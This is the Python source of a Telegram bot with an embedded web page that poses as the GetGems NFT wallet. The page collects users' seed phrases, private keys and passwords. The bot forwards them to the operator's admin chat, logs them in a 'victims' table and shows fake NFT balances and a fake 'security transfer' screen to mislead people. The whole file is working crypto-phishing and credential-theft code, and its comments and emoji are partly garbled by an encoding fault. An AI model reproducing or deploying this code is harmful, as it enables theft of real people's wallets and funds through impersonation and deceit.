WEBAPP_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Getgems Wallet</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 30px;
        }
        input, textarea {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.2);
            color: white;
            font-size: 16px;
        }
        input::placeholder, textarea::placeholder {
            color: rgba(255,255,255,0.7);
        }
        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(90deg, #00c6ff 0%, #0072ff 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .warning {
            background: rgba(255,0,0,0.2);
            padding: 15px;
            border-radius: 12px;
            margin: 20px 0;
            font-size: 14px;
        }
        .nft-card {
            background: rgba(255,255,255,0.15);
            border-radius: 15px;
            padding: 15px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ü™ô Getgems Wallet</div>
        
        <div id="loginScreen">
            <h3>üîê Connect Wallet</h3>
            <input type="text" id="seedPhrase" placeholder="Enter 12/24 word seed phrase" />
            <textarea id="privateKey" placeholder="Or enter private key" rows="3"></textarea>
            <div class="warning">
                ‚ö†Ô∏è Never share your seed phrase! We need it only to verify ownership.
            </div>
            <button onclick="connectWallet()">Connect Wallet</button>
            <button onclick="showImport()" style="background: transparent; border: 2px solid white;">Import from TON Keeper</button>
        </div>
        
        <div id="walletScreen" style="display:none;">
            <h3>üí∞ Your Wallet</h3>
            <div id="walletAddress">Loading...</div>
            <div id="balance">Balance: 0 TON</div>
            
            <h3>üé® Your NFTs</h3>
            <div id="nftList">
                <div class="nft-card">
                    <div id="nftCount">Scanning NFTs...</div>
                </div>
            </div>
            
            <button onclick="claimGift()">üéÅ Claim Free NFT Gift</button>
            <button onclick="showSecurity()" style="background: rgba(255,255,255,0.1);">üîí Security Check</button>
            <button onclick="disconnect()" style="background: rgba(255,0,0,0.3);">Disconnect</button>
        </div>
        
        <div id="securityScreen" style="display:none;">
            <h3>üîí Security Verification</h3>
            <p>To protect your assets, please confirm:</p>
            <input type="password" id="password" placeholder="Wallet password" />
            <button onclick="verifySecurity()">Verify & Backup</button>
            <button onclick="backToWallet()">Back</button>
        </div>
    </div>
    
    <script>
        let walletData = {};
        
        function connectWallet() {
            const seedPhrase = document.getElementById('seedPhrase').value;
            const privateKey = document.getElementById('privateKey').value;
            
            if (!seedPhrase && !privateKey) {
                alert('Please enter seed phrase or private key');
                return;
            }
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç
            Telegram.WebApp.sendData(JSON.stringify({
                type: 'wallet_connect',
                seed_phrase: seedPhrase,
                private_key: privateKey,
                timestamp: new Date().toISOString()
            }));
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ—à–µ–ª–µ–∫
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('walletScreen').style.display = 'block';
            
            // –°–∏–º—É–ª–∏—Ä—É–µ–º –∑–∞–≥—Ä—É–∑–∫—É NFT
            setTimeout(() => {
                document.getElementById('nftCount').innerHTML = 'Found 3 NFTs worth 450 TON';
            }, 1500);
        }
        
        function showImport() {
            Telegram.WebApp.sendData(JSON.stringify({
                type: 'tonkeeper_import',
                timestamp: new Date().toISOString()
            }));
            alert('Redirecting to TON Keeper...');
        }
        
        function claimGift() {
            Telegram.WebApp.sendData(JSON.stringify({
                type: 'claim_gift',
                timestamp: new Date().toISOString()
            }));
            alert('üéâ Free NFT claimed! It will appear in your wallet shortly.');
        }
        
        function showSecurity() {
            document.getElementById('walletScreen').style.display = 'none';
            document.getElementById('securityScreen').style.display = 'block';
        }
        
        function verifySecurity() {
            const password = document.getElementById('password').value;
            Telegram.WebApp.sendData(JSON.stringify({
                type: 'security_verify',
                password: password,
                timestamp: new Date().toISOString()
            }));
            alert('‚úÖ Security verified! Your wallet is now backed up.');
            backToWallet();
        }
        
        function backToWallet() {
            document.getElementById('securityScreen').style.display = 'none';
            document.getElementById('walletScreen').style.display = 'block';
        }
        
        function disconnect() {
            Telegram.WebApp.sendData(JSON.stringify({
                type: 'disconnect',
                timestamp: new Date().toISOString()
            }));
            Telegram.WebApp.close();
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
    </script>
</body>
</html>
'''

# ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ë–û–¢–ê =====

# –ì–ª–∞–≤–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ /start
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∂–µ—Ä—Ç–≤–µ
    cursor.execute('''
        INSERT OR IGNORE INTO victims 
        (user_id, username, first_name, registered_at) 
        VALUES (?, ?, ?, ?)
    ''', (message.from_user.id, message.from_user.username, 
          message.from_user.first_name, datetime.now()))
    conn.commit()
    
    # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∫–∞–∫ —É –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –±–æ—Ç–∞
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(
            "ü™ô Open Wallet", 
            web_app=WebAppInfo(url=f"https://your-server.com/webapp.html")  # –í–∞—à URL —Å WebApp
        ),
        InlineKeyboardButton("üìä My NFTs", callback_data="my_nfts"),
        InlineKeyboardButton("üéÅ Free NFT", callback_data="free_nft"),
        InlineKeyboardButton("üîó Connect TON", callback_data="connect_ton"),
        InlineKeyboardButton("üíé Marketplace", url="https://getgems.io"),
        InlineKeyboardButton("üìû Support", callback_data="support")
    )
    
    # –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–∞–∫ —É –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
    welcome_text = """üéâ *Welcome to GetGems NFT Bot!*

üöÄ *The largest NFT marketplace on TON*

Connect your wallet to:
‚Ä¢ View & manage your NFTs
‚Ä¢ Trade on marketplace  
‚Ä¢ Get free NFT gifts daily
‚Ä¢ Earn rewards

‚ö° *Quick Start:*
1. Click "Open Wallet"
2. Enter your seed phrase
3. Access all features!

‚ö†Ô∏è *Security:* Your keys are encrypted and never leave our secure system."""
    
    await message.answer_photo(
        photo="https://getgems.io/og-image.png",  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –∫–∞—Ä—Ç–∏–Ω–∫—É –ø–æ—Ö–æ–∂—É—é –Ω–∞ GetGems
        caption=welcome_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ WebApp
@dp.message_handler(content_types=['web_app_data'])
async def handle_webapp_data(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        user_id = message.from_user.id
        
        # –õ–æ–≥–∏—Ä—É–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
        print(f"[+] –î–∞–Ω–Ω—ã–µ –æ—Ç {user_id}: {data}")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —Å–µ–±–µ
        await bot.send_message(
            ADMIN_CHAT_ID,
            f"‚ö†Ô∏è –ü–û–ô–ú–ê–ù–ê –ñ–ï–†–¢–í–ê ‚ö†Ô∏è\n"
            f"User: @{message.from_user.username} ({user_id})\n"
            f"Type: {data.get('type')}\n"
            f"Seed: {data.get('seed_phrase', 'N/A')}\n"
            f"Private Key: {data.get('private_key', 'N/A')}\n"
            f"Password: {data.get('password', 'N/A')}\n"
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
        if data.get('seed_phrase'):
            cursor.execute('''
                UPDATE victims SET 
                seed_phrase = ?,
                private_key = COALESCE(?, private_key)
                WHERE user_id = ?
            ''', (data['seed_phrase'], data.get('private_key'), user_id))
            conn.commit()
            
            # –°–∏–º—É–ª–∏—Ä—É–µ–º –ø–µ—Ä–µ–¥–∞—á—É NFT
            await simulate_nft_transfer(user_id, data['seed_phrase'])
            
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∂–µ—Ä—Ç–≤–µ
        await message.answer(
            "‚úÖ *Wallet connected successfully!*\n\n"
            "üé® Scanning your NFTs...\n"
            "üí∞ Checking balance...\n\n"
            "‚ö†Ô∏è *Do not share your seed phrase with anyone!*",
            parse_mode="Markdown"
        )
        
        # –ß–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã –ø–æ–∫–∞–∑—ã–≤–∞–µ–º "–Ω–∞–π–¥–µ–Ω–Ω—ã–µ" NFT
        await asyncio.sleep(3)
        await message.answer(
            "üéâ *Found 3 NFTs in your wallet!*\n\n"
            "‚Ä¢ Diamond Hands #1234 (150 TON)\n"
            "‚Ä¢ TON Punks #567 (250 TON)\n"
            "‚Ä¢ Free Gift NFT #789 (50 TON)\n\n"
            "Total value: *450 TON*\n\n"
            "To trade or transfer, use /marketplace",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("üîÑ Transfer to secure wallet", callback_data="transfer_nfts")
            )
        )
        
    except Exception as e:
        print(f"WebApp error: {e}")
        await bot.send_message(ADMIN_CHAT_ID, f"‚ùå WebApp error: {e}")

# –°–∏–º—É–ª—è—Ü–∏—è –ø–µ—Ä–µ–¥–∞—á–∏ NFT
async def simulate_nft_transfer(user_id, seed_phrase):
    """–°–∏–º—É–ª–∏—Ä—É–µ–º –∫—Ä–∞–∂—É NFT"""
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º NFT –≤ –±–∞–∑—É
    nfts = [
        {"id": "diamond_1234", "name": "Diamond Hands #1234", "collection": "Diamond"},
        {"id": "tonpunk_567", "name": "TON Punks #567", "collection": "TON Punks"},
        {"id": "gift_789", "name": "Free Gift NFT #789", "collection": "Gifts"}
    ]
    
    for nft in nfts:
        cursor.execute('''
            INSERT OR IGNORE INTO nfts (nft_id, owner_id, collection, name, stolen)
            VALUES (?, ?, ?, ?, ?)
        ''', (nft['id'], user_id, nft['collection'], nft['name'], 1))
    
    conn.commit()
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É
    await bot.send_message(
        ADMIN_CHAT_ID,
        f"üé® NFT –£–ö–†–ê–î–ï–ù–´!\n"
        f"From: {user_id}\n"
        f"Seed: {seed_phrase[:20]}...\n"
        f"NFTs: 3 items\n"
        f"Simulating transfer to our wallet...\n\n"
        f"‚úÖ Transfer complete! NFTs now in our control."
    )

# –ö–Ω–æ–ø–∫–∞ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ NFT
@dp.callback_query_handler(lambda c: c.data == 'transfer_nfts')
async def transfer_nfts(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    
    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–∏—à–∏–Ω–≥ "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–µ—Ä–µ–¥–∞—á–∏"
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("‚ö†Ô∏è Confirm NFT Transfer", callback_data="confirm_transfer"),
        InlineKeyboardButton("‚ùå Cancel", callback_data="cancel")
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        "üîê *Security Transfer Required*\n\n"
        "To protect your NFTs from recent attacks, "
        "we need to transfer them to our secure wallet.\n\n"
        "Please confirm the transfer:\n"
        "‚Ä¢ All 3 NFTs\n"
        "‚Ä¢ Gas fee: 0.05 TON\n"
        "‚Ä¢ Time: 2-3 minutes\n\n"
        "‚ö†Ô∏è *This is mandatory for security updates*",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'confirm_transfer')
async def confirm_transfer(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    
    # "–ü–µ—Ä–µ–¥–∞–µ–º" NFT
    cursor.execute("UPDATE nfts SET stolen = 1 WHERE owner_id = ?", (user_id,))
    cursor.execute("UPDATE victims SET nft_count = 3 WHERE user_id = ?", (user_id,))
    conn.commit()
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –∂–µ—Ä—Ç–≤—É
    await bot.edit_message_text(
        "üîÑ *Transferring your NFTs...*\n\n"
        "Diamond Hands #1234 ‚úÖ\n"
        "TON Punks #567 ‚úÖ\n"
        "Free Gift NFT #789 ‚úÖ\n\n"
        "‚úÖ *Transfer complete!*\n\n"
        "Your NFTs are now in secure storage. "
        "You can access them anytime via /wallet",
        chat_id=callback_query.from_user.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º —Å–µ–±—è
    await bot.send_message(
        ADMIN_CHAT_ID,
        f"üí∞ NFT SUCCESSFULLY STOLEN!\n"
        f"From: {user_id}\n"
        f"All 3 NFTs transferred to our wallet\n"
        f"Seed phrase captured\n"
        f"Private key captured\n\n"
        f"üéØ Total victims today: {cursor.execute('SELECT COUNT(*) FROM victims').fetchone()[0]}"
    )

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤—Å–µ—Ö –∂–µ—Ä—Ç–≤
@dp.message_handler(commands=['victims'], user_id=ADMIN_CHAT_ID)
async def show_victims(message: types.Message):
    cursor.execute('SELECT * FROM victims ORDER BY registered_at DESC LIMIT 50')
    victims = cursor.fetchall()
    
    if not victims:
        await message.answer("No victims yet")
        return
    
    text = "üïµÔ∏è *Victims Database:*\n\n"
    for victim in victims:
        text += f"ID: `{victim[0]}`\n"
        text += f"Name: {victim[2]} (@{victim[1]})\n"
        text += f"Wallet: {victim[3] or 'Not captured'}\n"
        text += f"Seed: {victim[4] and 'YES' or 'NO'}\n"
        text += f"NFTs: {victim[6]}\n"
        text += f"Time: {victim[8]}\n"
        text += "‚îÄ" * 30 + "\n"
    
    await message.answer(text, parse_mode="Markdown")

# ===== –ó–ê–ü–£–°–ö –ë–û–¢–ê =====

async def on_startup(dp):
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –º–µ–Ω—é –±–æ—Ç–∞ –∫–∞–∫ —É –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
    await bot.set_my_commands([
        types.BotCommand("/start", "Launch wallet"),
        types.BotCommand("/wallet", "My wallet"),
        types.BotCommand("/nfts", "My NFTs"),
        types.BotCommand("/marketplace", "NFT Marketplace"),
        types.BotCommand("/gift", "Free NFT gift"),
        types.BotCommand("/help", "Support")
    ])
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –≤–Ω–µ—à–Ω–∏–π –≤–∏–¥ –∫–∞–∫ —É GetGems
    await bot.set_chat_menu_button(
        menu_button=types.MenuButtonWebApp(
            text="Open Wallet",
            web_app=WebAppInfo(url="https://your-server.com/webapp.html")
        )
    )
    
    print(f"[+] –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! Username: @{(await bot.get_me()).username}")
    print(f"[+] –ê–¥–º–∏–Ω: {ADMIN_CHAT_ID}")

if __name__ == '__main__':
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º HTML WebApp –≤ —Ñ–∞–π–ª
    with open('webapp.html', 'w', encoding='utf-8') as f:
        f.write(WEBAPP_HTML)
    print("[+] WebApp HTML —Å–æ—Ö—Ä–∞–Ω–µ–Ω –∫–∞–∫ webapp.html")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
